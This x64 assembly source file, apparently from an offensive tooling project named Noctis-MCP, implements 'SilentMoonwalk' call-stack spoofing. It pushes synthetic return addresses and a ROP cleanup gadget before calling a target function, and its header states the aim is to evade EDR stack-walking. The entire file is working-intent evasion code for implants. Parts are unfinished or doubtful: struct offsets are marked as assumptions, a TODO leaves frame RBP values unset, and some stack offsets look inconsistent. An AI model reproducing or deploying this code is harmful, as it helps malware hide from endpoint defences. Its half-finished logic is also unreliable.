; SilentMoonwalk Assembly Trampoline (x64)
; Call stack spoofing using ROP gadgets and synthetic frames
;
; Purpose: Execute function with fake call stack to evade EDR stack-walking
; Technique: Build synthetic stack frames pointing to legitimate code
;
; Author: Noctis-MCP
; Architecture: x64 only

.code

; ========================================================================
; SilentMoonwalk_CallFunction - Execute with spoofed call stack
; ========================================================================
; Parameters:
;   RCX = PSPOOF_CONTEXT (pointer to spoofing context)
;   RDX = Function pointer to call
;   R8  = arg1
;   R9  = arg2
;   [RSP+28h] = arg3
;   [RSP+30h] = arg4
;
; Context structure offsets (must match C struct):
;   +0x00: mode
;   +0x08: gadgets (cache structure)
;   +....: frames array
;   +....: dwFrameCount
;
; Returns:
;   RAX = Return value from called function
; ========================================================================
SilentMoonwalk_CallFunction PROC
    ; Save non-volatile registers
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    push rbp

    ; Save original RSP for cleanup
    mov r15, rsp                ; R15 = original stack pointer

    ; Save parameters we'll need later
    mov r12, rcx                ; R12 = pContext
    mov r13, rdx                ; R13 = pFunction
    mov r14, r8                 ; R14 = arg1
    mov rsi, r9                 ; RSI = arg2

    ; Load frame count from context
    ; Assuming dwFrameCount is at offset 0x220 (this needs to match the actual struct)
    mov ebx, [r12 + 220h]       ; EBX = dwFrameCount
    test ebx, ebx
    jz no_frames                ; If no frames, just call directly

    ; Build synthetic frames
    ; Each frame is: PVOID returnAddress (8 bytes) + PVOID rbpValue (8 bytes) = 16 bytes
    ; Frames array starts at offset 0x200 (adjust based on actual struct)
    lea rdi, [r12 + 200h]       ; RDI = &frames[0]

build_frame_loop:
    test ebx, ebx
    jz frames_built

    ; Push synthetic return address
    mov rax, [rdi]              ; Load returnAddress
    push rax

    ; Save synthetic RBP value (we'll set it in the last frame)
    ; For now, we'll use a ROP gadget approach
    ; TODO: Set RBP values properly

    ; Move to next frame
    add rdi, 10h                ; sizeof(SYNTHETIC_FRAME) = 16 bytes
    dec ebx
    jmp build_frame_loop

frames_built:
    ; Push cleanup gadget address (add rsp, XX; ret)
    ; This will skip over synthetic frames when function returns
    ; Assuming addRsp28Ret gadget is at offset 0x120 in context
    mov rax, [r12 + 120h]       ; Load gadget address
    push rax

no_frames:
    ; Setup arguments for target function (x64 fastcall)
    mov rcx, r14                ; arg1
    mov rdx, rsi                ; arg2
    mov r8, [r15 + 40h]         ; arg3 (from original stack + offset for pushes)
    mov r9, [r15 + 48h]         ; arg4

    ; Call target function
    call r13

    ; Save return value
    mov r14, rax

    ; Restore stack (ROP gadget should have cleaned up synthetic frames)
    mov rsp, r15

    ; Restore non-volatile registers
    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx

    ; Return value is in RAX (from R14)
    mov rax, r14
    ret

SilentMoonwalk_CallFunction ENDP

; ========================================================================
; SilentMoonwalk_CallFunction4 - Simplified version for up to 4 args
; ========================================================================
; This is a simpler implementation that just spoofs the immediate caller
; More reliable and easier to use
; ========================================================================
SilentMoonwalk_CallFunction4 PROC
    ; Save registers
    push rbp
    push rbx
    push rsi
    push rdi

    ; Save parameters
    mov rbx, rcx                ; pContext
    mov rsi, rdx                ; pFunction
    mov rdi, r8                 ; arg1

    ; Get synthetic return address from first frame
    ; frames[0].returnAddress at offset 0x200
    mov rax, [rbx + 200h]
    push rax                    ; Push fake return address

    ; Setup arguments
    mov rcx, rdi                ; arg1
    mov rdx, r9                 ; arg2
    mov r8, [rsp + 38h]         ; arg3
    mov r9, [rsp + 40h]         ; arg4

    ; Call function
    call rsi

    ; Clean up fake return address
    add rsp, 8

    ; Restore registers
    pop rdi
    pop rsi
    pop rbx
    pop rbp

    ret

SilentMoonwalk_CallFunction4 ENDP

END
